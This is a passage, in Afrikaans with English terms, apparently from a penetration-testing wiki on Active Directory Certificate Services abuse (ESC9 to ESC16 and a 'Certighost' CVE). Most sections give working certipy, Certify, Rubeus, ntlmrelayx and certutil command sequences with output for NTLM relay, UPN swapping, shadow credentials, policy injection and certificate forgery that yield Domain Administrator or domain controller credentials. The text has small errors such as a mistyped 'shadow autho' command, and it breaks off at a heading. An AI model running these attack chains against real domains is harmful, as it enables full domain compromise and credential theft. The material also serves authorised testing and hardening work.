
Die aanvraag vir ’n sertifikaat word by verstek deur Certipy gebaseer op die template `Machine` of `User`, bepaal deur of die rekeningnaam wat gerelay word met `$` eindig. ’n Alternatiewe template kan gespesifiseer word deur die `-template`-parameter te gebruik.

’n Tegniek soos [PetitPotam](https://github.com/ly4k/PetitPotam) kan dan gebruik word om verifikasie af te dwing. Wanneer daar met domeinbeheerders gewerk word, is die spesifikasie van `-template DomainController` nodig.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Geen Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Verduideliking

Die nuwe waarde **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) vir **`msPKI-Enrollment-Flag`**, waarna as ESC9 verwys word, voorkom dat die **nuwe `szOID_NTDS_CA_SECURITY_EXT` security extension** in ’n sertifikaat ingebed word. Hierdie flag word relevant wanneer `StrongCertificateBindingEnforcement` op `1` gestel is (die verstekinstelling), in teenstelling met ’n instelling van `2`. Die relevansie daarvan neem toe in scenario’s waar ’n swakker certificate mapping vir Kerberos of Schannel uitgebuit kan word (soos in ESC10), aangesien die afwesigheid van ESC9 nie die vereistes sou verander nie.<sup>[[7]](#references)</sup>

Die toestande waaronder die instelling van hierdie flag betekenisvol word, sluit in:

- `StrongCertificateBindingEnforcement` is nie op `2` gestel nie (die verstekwaarde is `1`), of `CertificateMappingMethods` sluit die `UPN`-flag in.
- Die sertifikaat is gemerk met die `CT_FLAG_NO_SECURITY_EXTENSION`-flag binne die `msPKI-Enrollment-Flag`-instelling.
- Enige client authentication EKU word deur die sertifikaat gespesifiseer.
- `GenericWrite`-permissions is beskikbaar oor enige account om ’n ander account te compromise.

### Abuse Scenario

Gestel `John@corp.local` het `GenericWrite`-permissions oor `Jane@corp.local`, met die doel om `Administrator@corp.local` te compromise. Die `ESC9` certificate template, waarvoor `Jane@corp.local` toestemming het om in te enroll, is met die `CT_FLAG_NO_SECURITY_EXTENSION`-flag in sy `msPKI-Enrollment-Flag`-instelling gekonfigureer.

Aanvanklik word `Jane` se hash verkry met behulp van Shadow Credentials, danksy `John` se `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Daarna word `Jane` se `userPrincipalName` gewysig na `Administrator`, met die `@corp.local`-domeingedeelte opsetlik weggelaat:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Hierdie wysiging oortree nie beperkings nie, aangesien `Administrator@corp.local` onderskei bly as `Administrator` se `userPrincipalName`.

Daarna word die kwesbaar gemerkte `ESC9`-sertifikaatsjabloon as `Jane` aangevra:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Daar word opgemerk dat die sertifikaat se `userPrincipalName` `Administrator` weerspieël, sonder enige “object SID”.

`Jane` se `userPrincipalName` word daarna na haar oorspronklike waarde teruggestel, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Poging tot authentication met die uitgereikte sertifikaat lewer nou die NT-hash van `Administrator@corp.local`. Die opdrag moet `-domain <domain>` insluit weens die sertifikaat se gebrek aan ’n domeinspesifikasie:
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Swak Sertifikaatkarterings - ESC10

### Verduideliking

Daar word na twee register-sleutelwaardes op die domain controller verwys deur ESC10:

- Die verstekwaarde vir `CertificateMappingMethods` onder `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), voorheen gestel op `0x1F`.
- Die verstekinstelling vir `StrongCertificateBindingEnforcement` onder `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, voorheen `0`.<sup>[[7]](#references)</sup>

**Geval 1**

Wanneer `StrongCertificateBindingEnforcement` as `0` gekonfigureer is.

**Geval 2**

As `CertificateMappingMethods` die `UPN`-bit (`0x4`) insluit.

### Misbruikgeval 1

Met `StrongCertificateBindingEnforcement` as `0` gekonfigureer, kan ’n rekening A met `GenericWrite`-toestemmings uitgebuit word om enige rekening B te kompromitteer.

Byvoorbeeld, met `GenericWrite`-toestemmings oor `Jane@corp.local` poog ’n aanvaller om `Administrator@corp.local` te kompromitteer. Die prosedure weerspieël ESC9, wat enige sertifikaatsjabloon toelaat om gebruik te word.

Eerstens word `Jane` se hash met behulp van Shadow Credentials verkry, deur die `GenericWrite` uit te buit.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Vervolgens word `Jane` se `userPrincipalName` na `Administrator` verander, met opset sonder die `@corp.local`-gedeelte om ’n constraint-oortreding te vermy.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Hierna word 'n sertifikaat wat kliëntverifikasie moontlik maak, as `Jane` aangevra deur die verstek `User`-template te gebruik.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` se `userPrincipalName` word dan na sy oorspronklike `Jane@corp.local` teruggestel.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Authenticating with the obtained certificate will yield the NT hash of `Administrator@corp.local`, necessitating the specification of the domain in the command due to the absence of domain details in the certificate.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Misbruikgeval 2

Met die `CertificateMappingMethods` wat die `UPN`-bitvlag (`0x4`) bevat, kan ’n rekening A met `GenericWrite`-toestemmings enige rekening B kompromitteer wat nie ’n `userPrincipalName`-eienskap het nie, insluitend masjienrekeninge en die ingeboude domeinadministrateur `Administrator`.

Hier is die doel om `DC$@corp.local` te kompromitteer, deur eers Jane se hash deur Shadow Credentials te verkry en die `GenericWrite` te benut.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` se `userPrincipalName` word dan op `DC$@corp.local` gestel.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
'n Sertifikaat vir kliëntverifikasie word as `Jane` met die verstek `User`-template aangevra.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` se `userPrincipalName` word ná hierdie proses na sy oorspronklike waarde teruggestel.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Om via Schannel te autentiseer, word Certipy se `-ldap-shell`-opsie gebruik, wat suksesvolle verifikasie as `u:CORP\DC$` aandui.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Via die LDAP shell maak commands soos `set_rbcd` Resource-Based Constrained Delegation (RBCD)-aanvalle moontlik, wat die domeinbeheerder potensieel kan kompromitteer.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Hierdie kwesbaarheid strek ook tot enige gebruikersrekening wat nie ’n `userPrincipalName` het nie, of waar dit nie met die `sAMAccountName` ooreenstem nie. Die verstek-`Administrator@corp.local` is ’n primêre teiken weens sy verhoogde LDAP-privileges en die verstek-afwesigheid van ’n `userPrincipalName`.

## Relaying NTLM to ICPR - ESC11

### Verduideliking

As die CA Server nie met `IF_ENFORCEENCRYPTICERTREQUEST` gekonfigureer is nie, kan NTLM relay attacks sonder signing via die RPC service uitgevoer word. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Jy kan `certipy` gebruik om te enumerateer of `Enforce Encryption for Requests` Disabled is; certipy sal `ESC11` Vulnerabilities wys.
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Misbruikscenario

Dit is nodig om ’n relay server op te stel:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Nota: Vir domeinbeheerders moet ons `-template` in DomainController spesifiseer.

Of deur [sploutchy se fork van impacket](https://github.com/sploutchy/impacket) te gebruik:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Verduideliking

Administrators kan die Certificate Authority opstel om dit op ’n eksterne toestel soos die "Yubico YubiHSM2" te stoor.

Indien ’n USB-toestel via ’n USB-poort aan die CA-bediener gekoppel is, of aan ’n USB-toestelbediener indien die CA-bediener ’n virtuele masjien is, word ’n authentication key (soms na verwys as ’n "password") benodig sodat die Key Storage Provider sleutels in die YubiHSM kan genereer en gebruik.

Hierdie key/password word in die registry onder `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in cleartext gestoor.

Verwysing [hier](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Abuse Scenario

Indien die CA se private key op ’n fisiese USB-toestel gestoor word wanneer jy shell access verkry het, is dit moontlik om die key te herstel.

Eerstens moet jy die CA certificate verkry (dit is publiek), en dan:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Gebruik laastens die certutil `-sign`-opdrag om ’n nuwe arbitrêre sertifikaat met die CA-sertifikaat en sy private sleutel te vervals.

## OID Group Link Abuse - ESC13

### Verduideliking

Die `msPKI-Certificate-Policy`-attribuut laat toe dat die uitreikingsbeleid by die sertifikaatsjabloon gevoeg word. Die `msPKI-Enterprise-Oid`-objekte wat verantwoordelik is vir die uitreiking van beleide, kan in die Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) van die PKI OID-container ontdek word. ’n Beleid kan met ’n AD-groep gekoppel word deur hierdie objek se `msDS-OIDToGroupLink`-attribuut, wat ’n stelsel in staat stel om ’n gebruiker wat die sertifikaat aanbied, te magtig asof hy ’n lid van die groep is. [Verwysing hier](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Met ander woorde, wanneer ’n gebruiker toestemming het om ’n sertifikaat te enroll en die sertifikaat aan ’n OID-groep gekoppel is, kan die gebruiker die voorregte van hierdie groep erf.

Gebruik [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) om OIDToGroupLink te vind:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Misbruikscenario

Vind 'n gebruikerspermission wat met `certipy find` of `Certify.exe find /showAllPermissions` gebruik kan word.

As `John` permission het om vir `VulnerableTemplate` te enroll, kan die gebruiker die privileges van die `VulnerableGroup`-groep erf.

Al wat dit hoef te doen, is om die template te spesifiseer; dit sal 'n certificate met `OIDToGroupLink`-regte kry.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Kwesbare sertifikaatvernuwingkonfigurasie- ESC14

### Verduideliking

Die beskrywing by https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping is buitengewoon deeglik. Hieronder is ’n aanhaling van die oorspronklike teks.<sup>[[14]](#references)</sup>

ESC14 spreek kwesbaarhede aan wat voortspruit uit "weak explicit certificate mapping", hoofsaaklik deur die misbruik of onveilige konfigurasie van die `altSecurityIdentities`-attribuut op Active Directory-gebruiker- of rekenaarrekeninge. Hierdie multiwaarde-attribuut laat administrateurs toe om X.509-sertifikate handmatig aan ’n AD-rekening te koppel vir authentication-doeleindes. Wanneer dit ingevul is, kan hierdie eksplisiete mappings die versteksertifikaatkarteringslogika oorskryf, wat gewoonlik staatmaak op UPN’s of DNS-name in die SAN van die sertifikaat, of die SID wat in die `szOID_NTDS_CA_SECURITY_EXT`-sekuriteitsuitbreiding ingebed is.

’n "Weak" mapping ontstaan wanneer die stringwaarde wat binne die `altSecurityIdentities`-attribuut gebruik word om ’n sertifikaat te identifiseer, te wyd is, maklik geraai kan word, op nie-unieke sertifikaatvelde staatmaak, of maklik nagebootste sertifikaatkomponente gebruik. As ’n aanvaller ’n sertifikaat kan bekom of skep waarvan die attribute met so ’n swak gedefinieerde eksplisiete mapping vir ’n bevoorregte rekening ooreenstem, kan hulle daardie sertifikaat gebruik om as daardie rekening te authenticate en dit na te boots.

Voorbeelde van potensieel swak `altSecurityIdentities`-mapping-stringe sluit in:

- Mapping slegs volgens ’n algemene Subject Common Name (CN): bv. `X509:<S>CN=SomeUser`. ’n Aanvaller kan moontlik ’n sertifikaat met hierdie CN vanaf ’n minder veilige bron bekom.
- Die gebruik van oormatig generiese Issuer Distinguished Names (DN’s) of Subject DN’s sonder verdere kwalifikasie, soos ’n spesifieke reeksnommer of subject key identifier: bv. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Die gebruik van ander voorspelbare patrone of nie-kriptografiese identifiseerders waaraan ’n aanvaller moontlik kan voldoen in ’n sertifikaat wat hulle wettiglik kan bekom of vervals (indien hulle ’n CA gekompromitteer het of ’n kwesbare template soos in ESC1 gevind het).

Die `altSecurityIdentities`-attribuut ondersteun verskeie formate vir mapping, soos:

- `X509:<I>IssuerDN<S>SubjectDN` (karteer volgens die volledige Issuer en Subject DN)
- `X509:<SKI>SubjectKeyIdentifier` (karteer volgens die sertifikaat se Subject Key Identifier-uitbreidingswaarde)
- `X509:<SR>SerialNumberBackedByIssuerDN` (karteer volgens reeksnommer, implisiet gekwalifiseer deur die Issuer DN) - dit is nie ’n standaardformaat nie; gewoonlik is dit `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (karteer volgens ’n RFC822-naam, tipies ’n e-posadres, vanaf die SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (karteer volgens ’n SHA1-hash van die sertifikaat se rou publieke sleutel - oor die algemeen sterk)

Die sekuriteit van hierdie mappings hang sterk af van die spesifisiteit, uniekheid en kriptografiese sterkte van die gekose sertifikaatidentifiseerders wat in die mapping-string gebruik word. Selfs wanneer sterk sertifikaatbindingmodusse op Domain Controllers geaktiveer is (wat hoofsaaklik implisiete mappings volgens SAN UPN’s/DNS en die SID-uitbreiding beïnvloed), kan ’n swak gekonfigureerde `altSecurityIdentities`-inskrywing steeds ’n direkte pad vir impersonation bied indien die mappinglogika self gebrekkig of te permissief is.
### Misbruikscenario

ESC14 teiken **eksplisiete sertifikaatmappings** in Active Directory (AD), spesifiek die `altSecurityIdentities`-attribuut. Indien hierdie attribuut gestel is (hetsy doelbewus of weens ’n verkeerde konfigurasie), kan aanvallers rekeninge naboots deur sertifikate aan te bied wat met die mapping ooreenstem.

#### Scenario A: Aanvaller kan na `altSecurityIdentities` skryf

**Voorvereiste**: Die aanvaller het skryftoestemmings op die teikenrekening se `altSecurityIdentities`-attribuut, of die toestemming om dit toe te ken in die vorm van een van die volgende toestemmings op die teiken-AD-objek:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenario B: Teiken het swak mapping via X509RFC822 (e-pos)

- **Voorvereiste**: Die teiken het ’n swak X509RFC822-mapping in altSecurityIdentities. ’n Aanvaller kan die slagoffer se mail-attribuut instel om met die teiken se X509RFC822-naam ooreen te stem, ’n sertifikaat as die slagoffer enroll, en dit gebruik om as die teiken te authenticate.
#### Scenario C: Teiken het X509IssuerSubject-mapping

- **Voorvereiste**: Die teiken het ’n swak X509IssuerSubject-eksplisiete mapping in `altSecurityIdentities`.Die aanvaller kan die `cn`- of `dNSHostName`-attribuut op ’n slagoffer-principal instel om met die subject van die teiken se X509IssuerSubject-mapping ooreen te stem. Daarna kan die aanvaller ’n sertifikaat as die slagoffer enroll en hierdie sertifikaat gebruik om as die teiken te authenticate.
#### Scenario D: Teiken het X509SubjectOnly-mapping

- **Voorvereiste**: Die teiken het ’n swak X509SubjectOnly-eksplisiete mapping in `altSecurityIdentities`. Die aanvaller kan die `cn`- of `dNSHostName`-attribuut op ’n slagoffer-principal instel om met die subject van die teiken se X509SubjectOnly-mapping ooreen te stem. Daarna kan die aanvaller ’n sertifikaat as die slagoffer enroll en hierdie sertifikaat gebruik om as die teiken te authenticate.
### konkrete bewerkings
#### Scenario A

Versoek ’n sertifikaat van die sertifikaattemplate `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Stoor en skakel die sertifikaat om
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Staaf (met behulp van die sertifikaat)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Skoonmaak (opsioneel)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Vir meer spesifieke aanvalmetodes in verskeie aanvalscenario's, verwys asseblief na die volgende: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Verduideliking

Die beskrywing by https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc is besonder volledig. Hieronder volg 'n aanhaling uit die oorspronklike teks.<sup>[[15]](#references)</sup>

Deur ingeboude verstek-weergawe 1 certificate templates te gebruik, kan 'n aanvaller 'n CSR skep om application policies in te sluit wat voorkeur geniet bo die Extended Key Usage-attributes wat in die template gekonfigureer is. Die enigste vereiste is enrollment-regte, en dit kan gebruik word om client authentication-, certificate request agent- en codesigning-sertifikate te genereer deur die **_WebServer_**-template te gebruik

### Misbruik

Die [Certipy privilege-escalation documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) bevat meer gedetailleerde gebruiksvoorbeelde.<sup>[[14]](#references)</sup>


Certipy se `find`-command kan help om V1 templates te identifiseer wat moontlik vatbaar is vir ESC15 indien die CA nie gepatch is nie.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Direkte nabootsing via Schannel

**Stap 1: Versoek ’n sertifikaat deur die "Client Authentication"-toepassingsbeleid en teiken-UPN in te spuit.** Aanvaller `attacker@corp.local` rig dit op `administrator@corp.local` met behulp van die "WebServer" V1-template (wat ’n enrollee-supplied subject toelaat).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Die kwesbare V1-template met "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Voeg die OID `1.3.6.1.5.5.7.3.2` by die Application Policies-uitbreiding van die CSR in.
- `-upn 'administrator@corp.local'`: Stel die UPN in die SAN vir impersonation.

**Stap 2: Authenticate via Schannel (LDAPS) using the obtained certificate.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos-impersonasie via Enrollment Agent Abuse

**Stap 1: Versoek ’n sertifikaat vanaf ’n V1-template (met "Enrollee supplies subject"), wat "Certificate Request Agent" Application Policy inspuit.** Hierdie sertifikaat is vir die aanvaller (`attacker@corp.local`) om ’n enrollment agent te word. Geen UPN word hier vir die aanvaller se eie identiteit gespesifiseer nie, aangesien die doel die agent-vermoë is.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Voeg OID `1.3.6.1.4.1.311.20.2.1` in.

**Stap 2: Gebruik die "agent"-sertifikaat om namens ’n geteikende bevoorregte gebruiker ’n sertifikaat aan te vra.** Dit is ’n ESC3-agtige stap wat die sertifikaat van Stap 1 as die agent-sertifikaat gebruik.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Stap 3: Authenticateer as die bevoorregte gebruiker met die "on-behalf-of"-sertifikaat.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Sekuriteitsuitbreiding Gedeaktiveer op CA (Globaal)-ESC16

### Verduideliking

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** verwys na die scenario waar, indien die konfigurasie van AD CS nie die insluiting van die **szOID_NTDS_CA_SECURITY_EXT**-uitbreiding in alle sertifikate afdwing nie, ’n aanvaller dit kan uitbuit deur:

1. ’n Sertifikaat **sonder SID binding** aan te vra.

2. Hierdie sertifikaat **vir authentication as enige rekening** te gebruik, soos om ’n rekening met hoë privileges (bv. ’n Domain Administrator) na te boots.

Jy kan ook na hierdie artikel verwys om meer oor die gedetailleerde beginsel te leer:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Misbruik

Die volgende verwys na [hierdie skakel](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally),Klik om meer gedetailleerde gebruiksmetodes te sien.<sup>[[14]](#references)</sup>

Om te identifiseer of die Active Directory Certificate Services (AD CS)-omgewing kwesbaar is vir **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Stap 1: Lees die aanvanklike UPN van die slagofferrekening (Opsioneel - vir herstel).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Stap 2: Werk die slagofferrekening se UPN by na die teikenadministrateur se `sAMAccountName`.
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Stap 3: (Indien nodig) Verkry geloofsbriewe vir die "slagoffer"-rekening (bv. via Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Stap 4: Versoek ’n certificate as die "victim"-gebruiker vanaf _enige geskikte client authentication template_ (bv. "User") op die ESC16-kwesbare CA.** Omdat die CA kwesbaar is vir ESC16, sal dit outomaties die SID security extension uit die uitgereikte certificate weglaat, ongeag die template se spesifieke instellings vir hierdie extension. Stel die Kerberos credential cache-omgewingsveranderlike (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
Versoek dan die sertifikaat:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Stap 5: Stel die UPN van die "slagoffer"-rekening terug.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Stap 6: Meld aan as die teikenadministrateur.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Verduideliking

**Certighost** misbruik 'n **AD CS enrollment chase / callback path** waar die CA op versoekers-verskafde request attributes vertrou om die identiteit te bepaal wat in die uitgereikte sertifikaat geplaas moet word. In die publieke PoC bevat die vervaardigde request:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: aanvaller-beheerde host/IP waarmee die CA sal verbind
- **`rmd`**: die **target Domain Controller DNS name** om na te boots

As die CA daardie chase volg, sal dit oor **SMB/LSA (`445`)** en **LDAP (`389`)** met die aanvaller verbind. Die aanvaller gebruik 'n **werklike machine account** (gewoonlik geskep via die verstek **`ms-DS-MachineAccountQuota`**) sodat die callback-sessie as 'n geldige domein-principal authenticate, maar die rogue services gee eerder die **target DC** se identity attributes terug:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

As die CA nie die teruggekose identiteit kriptografies aan die geauthentiseerde callback-principal bind nie, kan dit 'n sertifikaat vir die **Domain Controller** uitreik, selfs al het die sessie as die aanvaller-beheerde machine account geauthenticate. Dit maak die bug konseptueel anders as **Certifried**: in plaas daarvan om AD attributes soos `dNSHostName` te herskryf, **substitueer die aanvaller identity data tydens CA callback resolution**.<sup>[[2]](#references)</sup>

**Nuttige voorvereistes:**

- Lae-bevoorregte **domain credentials**
- Vermoë om 'n rekenaarrekening te **create or reuse**
- Network reachability vanaf die **CA** na aanvaller-beheerde **ports `389` en `445`**
- Kwesbare / ongepatchte CA request path (die Microsoft-opdatering van **14 Julie 2026** het **DC validation for `cdc`** plus 'n **resolved-SID comparison** bygevoeg)

Die gevolglike **`.pfx`** kan dan vir **PKINIT** gebruik word, wat 'n **`.ccache`** en, in die gepubliseerde PoC-flow, die **target DC NT hash** oplewer. Dit is normaalweg genoeg vir **full domain compromise**.

### Misbruik

Die publieke PoC automatiseer die volledige ketting:<sup>[[1]](#references)</sup>

1. Create or reuse 'n aanvaller-beheerde **machine account**.
2. Start **rogue LDAP and SMB/LSA listeners** op `389` en `445`.
3. Submit 'n certificate request wat aanvaller-beheerde **`cdc`**- en target **`rmd`**-attributes bevat.
4. Laat die CA by die rogue listeners authenticate as die beheerde machine account, maar antwoord die identity lookups met die **target DC**-attributes.
5. Receive 'n CA-signed **DC certificate**, en gebruik dit dan vir **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Nuttige runtime flags van die PoC:

- `--listener <ip>`: kies uitdruklik die callback-IP wat in `cdc` geadverteer word
- `--computer-name <NAME$>`: hergebruik ’n bestaande machine account in plaas daarvan om ’n nuwe een te skep

**Operasionele notas:**

- Die PoC benodig **root** omdat dit aan **bevoorregte poorte** `389` en `445` bind.
- Suksesvolle exploitation skryf ’n **DC `.pfx`** en **Kerberos `.ccache`** plaaslik.
- Omdat die sertifikaat aan ’n **Domain Controller account** gekoppel word, kan opvolgaksies **certificate-based Kerberos auth**, **DCSync** en hergebruik van die herwonne **machine NT hash** insluit.<sup>[[2]](#references)</sup>

## Kompromittering van Forests met Certificates Verduidelik in die Passiewe Vorm

### Verbreking van Forest Trusts deur Gekompromitteerde CAs

